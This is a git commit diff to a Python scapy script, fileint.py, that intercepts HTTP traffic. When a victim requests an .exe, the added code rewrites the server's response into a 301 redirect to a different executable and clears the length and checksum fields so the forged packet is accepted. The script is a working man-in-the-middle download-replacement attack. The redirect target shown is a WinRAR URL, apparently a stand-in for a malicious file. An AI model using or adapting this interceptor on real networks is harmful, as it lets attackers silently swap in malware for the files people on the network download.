03517fe00becdd5d06ab4d1dbf1a34ce2f06c904
xTeKc <bcd3v@pm.me>
2021-09-22 10:07:14 -0400

    redirect to new file url

--- fileint.py
+++ fileint.py
@@ -10,13 +10,15 @@ def process_packet():
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-            print(scapy_packet.show())
+
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                print(scapy_packet.show())
-        
+                scapy_packet[scapy.RAW].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe" # redirects to new .exe file url
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
 
     packet.accept()
 
